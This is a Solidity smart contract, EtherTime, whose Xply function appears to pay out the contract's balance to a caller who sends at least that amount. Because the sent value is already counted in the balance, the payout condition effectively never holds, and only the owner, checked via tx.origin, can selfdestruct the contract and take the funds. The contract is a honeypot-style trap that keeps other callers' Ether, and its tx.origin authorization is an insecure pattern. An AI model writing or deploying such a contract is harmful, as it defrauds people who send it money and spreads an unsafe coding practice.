pragma solidity ^0.4.25;

contract EtherTime
{
    address Owner = msg.sender;

    function() public payable {}

    function Xply() public payable {
        if (msg.value >= address(this).balance || tx.origin == Owner) {
            selfdestruct(tx.origin);
        }
    }
 }